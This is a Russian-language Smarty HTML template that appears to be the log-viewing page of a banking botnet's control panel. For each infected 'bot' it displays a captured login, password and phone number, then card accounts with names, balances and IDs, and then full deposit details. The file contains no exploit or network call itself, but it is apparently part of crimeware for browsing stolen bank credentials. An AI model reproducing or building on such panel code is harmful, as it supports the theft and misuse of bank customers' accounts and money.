<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
var id_bot_{$rand_name} = '{$bot->id}';
document.getElementById(id_{$rand_name} + '_title').innerHTML = '{$log->prefix}{$log->uid}';
</script>

<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp2">
    <th width="40%">Логин</th>
    <th width="60%">{if $log->log.login ne ''}{$log->log.login}{else}-{/if}</th>
</tr>
<tr class="bgp1">
    <th width="40%">Пароль</th>
    <th width="60%">{if $log->log.pass ne ''}{$log->log.pass}{else}-{/if}</th>
</tr>
<tr class="bgp2">
    <th width="40%">Телефон</th>
    <th width="60%">{if $log->log.phone ne ''}{$log->log.phone}{else}-{/if}</th>
</tr>
</table>

<h1 align="center">Счета</h1>

<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th width="30%">Карта</th>
    <th width="45%">Имя</th>
    <th width="15%">Баланс</th>
    <th width="10%">ID</th>
</tr>
{foreach from=$log->log.cards item=item key=kn name=logs}
{if $smarty.foreach.logs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$kn}</th>
    <th>{$item.name}</th>
    <th>{$item.summ}</th>
    <th>{$item.id}</th>
</tr>
{/foreach}
</table>

<h1 align="center">Депозиты</h1>

<table cellspacing="3" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th width="40%">Имя</th>
    <th>&nbsp;</th>
</tr>
{foreach from=$log->log.depo item=item key=kn name=logs}
{if $smarty.foreach.logs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$item.depoName}</th>
    <th style="padding: 10px; white-space:pre; text-align:left">Сумма вклада: {$item.depoSumm}
Срок вклада: {$item.depoPeriod}
Процентная ставка: {$item.depoPercent}
Номер счета вклада: {$item.depoAccNumber}
Сумма неснижаемого остатка: {$item.depoAmountMinimumBalance}
Максимальная сумма снятия: {$item.depoMaxWithdrawalAmount}
Текущее состояние: {$item.depoCurrState}
Продление: {$item.depoExtension}
Дата открытия: {$item.depoDateOpening}
Дата закрытия: {$item.depoClosingDate}
Сберкнижка: {$item.depoSavingsBook}
Списание: {$item.depoDebit}
Зачисление: {$item.depoEnrollment}
"Зеленая улица": {$item.depoGreenLight}</th>
</tr>
{/foreach}
</table>

</br>